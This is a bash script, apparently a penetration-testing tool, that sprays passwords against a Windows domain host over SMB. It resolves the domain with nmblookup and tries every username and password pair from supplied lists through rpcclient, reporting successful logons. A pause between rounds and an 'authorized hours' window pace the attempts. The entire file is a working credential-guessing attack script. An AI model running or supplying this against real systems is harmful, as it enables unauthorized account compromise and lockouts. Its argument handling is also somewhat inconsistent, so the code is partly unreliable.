#!/bin/bash

# Set the default time check to "day"
time_check="day"

# Parse command-line arguments
while getopts ":n" opt; do
  case $opt in
    n) time_check="night";;
    \?) echo "Invalid option: -$OPTARG" >&2;;
  esac
done

# Assign the script arguments to variables
START_TIME=$2
STOP_TIME=$3
USERS=$4
PASSWORDS=$5
SLEEP=$6
HOST=$7

# Find the paths to necessary utilities
RPCCLIENT=$(which rpcclient)
NMBLOOKUP=$(which nmblookup)

# Determine the domain from the host
DOMAIN="$($NMBLOOKUP -A $HOST | grep GROUP | head -1 | awk '{print $1}')"

# Set the current time
CURRENT_TIME=$(date +%H%M)

echo "time_check:" $time_check "start:" $START_TIME "stop:" $STOP_TIME 

# Wait until the current time is within the authorized hours
if [[ $time_check == "day" ]]; then
  while [[ 10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME ]]; do
    echo "This is a daytime attack. Currently waiting until authorized hours"
    sleep 300
    CURRENT_TIME=$(date +%H%M)
  done
else
  while [[ 10#$CURRENT_TIME -ge 10#$STOP_TIME || 10#$CURRENT_TIME -lt 10#$START_TIME ]]; do
    echo "This is an overnight attack. Currently waiting until authorized hours"
    sleep 300
    CURRENT_TIME=$(date +%H%M)
  done
fi

# The script will reach this point when the current time is within the authorized hours

# Start spraying passwords
while read PASS; do
  ITR="$((ITR + 1))"
  echo "Current Password:" $PASS

  while read USER; do
    $RPCCLIENT -m="SMB3" -U "${DOMAIN}\\${USER}%${PASS}" "$HOST" -c "getusername; quit" 2>/dev/null
    if [[ $? -eq 0 ]]; then
      echo -en "\e[32m[+]\e[0m "
      echo "${DOMAIN}\\${USER}:${PASS} - LOGON SUCCESS at $(date)"
    fi
  done < "$USERS"
  
  CURRENT_TIME=$(date +%H%M)
  if [[ $ITR -lt $(wc -l < "$PASSWORDS") ]]; then
    echo -e "\e[33m[+]\e[0m Sleeping ${SLEEP} seconds."
    sleep ${SLEEP}
  fi

  # Check if current time is outside authorized hours
  if [[ $time_check == "day" && (10#$CURRENT_TIME -lt 10#$START_TIME || 10#$CURRENT_TIME -ge 10#$STOP_TIME) ]] ||
     [[ $time_check == "night" && (10#$CURRENT_TIME -ge 10#$STOP_TIME || 10#$CURRENT_TIME -lt 10#$START_TIME) ]]; then
    TARGET_DATE=$(date -d "tomorrow $START_TIME" +%s)
    echo "Pausing - outside authorized hours. Will resume spraying again once authorized hours start."
    break
  fi

done < "$PASSWORDS"
